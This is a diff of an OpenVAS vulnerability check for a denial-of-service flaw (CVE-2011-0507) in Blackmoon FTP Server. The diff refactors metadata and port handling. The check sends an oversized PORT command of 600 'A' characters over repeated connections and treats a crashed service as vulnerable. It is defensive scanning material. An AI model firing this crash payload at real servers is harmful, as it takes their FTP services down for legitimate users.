@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_blackmoon_ftp_port_cmd_dos_vuln.nasl 4704 2016-12-07 14:26:08Z cfi $
+# $Id: gb_blackmoon_ftp_port_cmd_dos_vuln.nasl 11421 2018-09-17 06:58:23Z cfischer $
 #
 # Blackmoon FTP PORT Command Denial Of Service Vulnerability
 #
@@ -27,8 +27,8 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.800194");
-  script_version("$Revision: 4704 $");
-  script_tag(name:"last_modification", value:"$Date: 2016-12-07 15:26:08 +0100 (Wed, 07 Dec 2016) $");
+  script_version("$Revision: 11421 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-17 08:58:23 +0200 (Mon, 17 Sep 2018) $");
   script_tag(name:"creation_date", value:"2011-01-21 14:38:54 +0100 (Fri, 21 Jan 2011)");
   script_cve_id("CVE-2011-0507");
   script_bugtraq_id(45814);
@@ -44,28 +44,20 @@ if(description)
   script_xref(name:"URL", value:"http://secunia.com/advisories/42933/");
   script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/15986/");
 
-  tag_impact = "Successful exploitation will allow the remote attackers to cause a denial of
-  service.
+  script_tag(name:"impact", value:"Successful exploitation will allow the remote attackers to cause a denial of
+  service.");
 
-  Impact Level: Application";
+  script_tag(name:"affected", value:"Blackmoon FTP 3.1.6 - Build 1735");
 
-  tag_affected = "Blackmoon FTP 3.1.6 - Build 1735";
-
-  tag_insight = "The flaw is due to an error while parsing PORT command, which can be
+  script_tag(name:"insight", value:"The flaw is due to an error while parsing PORT command, which can be
   exploited to crash the FTP service by sending multiple PORT commands with
-  'big' parameter.";
+  'big' parameter.");
 
-  tag_solution = "Upgrade to Blackmoon FTP Version 3.1.7 Build 17356 or higher.
-  For updates refer to http://www.blackmoonftpserver.com/downloads.aspx";
+  script_tag(name:"solution", value:"Upgrade to Blackmoon FTP Version 3.1.7 Build 17356 or higher.
+  For updates refer to http://www.blackmoonftpserver.com/downloads.aspx");
 
-  tag_summary = "The host is running Blackmoon FTP Server and is prone to denial of service
-  vulnerability.";
-
-  script_tag(name:"impact", value:tag_impact);
-  script_tag(name:"affected", value:tag_affected);
-  script_tag(name:"insight", value:tag_insight);
-  script_tag(name:"solution", value:tag_solution);
-  script_tag(name:"summary", value:tag_summary);
+  script_tag(name:"summary", value:"The host is running Blackmoon FTP Server and is prone to denial of service
+  vulnerability.");
 
   script_tag(name:"solution_type", value:"VendorFix");
   script_tag(name:"qod_type", value:"remote_vul");
@@ -73,52 +65,33 @@ if(description)
   exit(0);
 }
 
-
 include("ftp_func.inc");
 
-## Get the default port of FTP
-ftpPort = get_kb_item("Services/ftp");
-if(!ftpPort){
-  ftpPort = 21;
-}
-
-## Check Port Status
-if(!get_port_state(ftpPort)){
-  exit(0);
-}
-
-# Get the FTP banner, Confirm the application is BlackMoon FTP Server
+ftpPort = get_ftp_port(default:21);
 banner = get_ftp_banner(port:ftpPort);
 if("220 BlackMoon FTP Server" >!< banner){
   exit(0);
 }
 
-## Crafted PORT Command
 crafted_port_cmd = string('PORT ', crap(length:600, data:'A'));
 
 for(i=0; i < 100; i++)
 {
-  ## Open FTP Socket
   soc = open_sock_tcp(ftpPort);
 
   ## BlackMoon FTP Server crashed, if it's not able to Open the socket
-  if(!soc)
-  {
+  if(!soc) {
     security_message(ftpPort);
     exit(0);
   }
- 
-  ## Receive the data
+
   res1 = ftp_recv_line(socket:soc);
 
-  ## Send Crafted PORT command
   res2 = ftp_send_cmd(socket:soc, cmd:crafted_port_cmd);
 
   ## Exit ; Patched FTP Server Response
   if("553 Requested action not taken (line too long)" >< res2){
     exit(0);
   }
-
-  ## FTP Close
   ftp_close(socket:soc);
 }
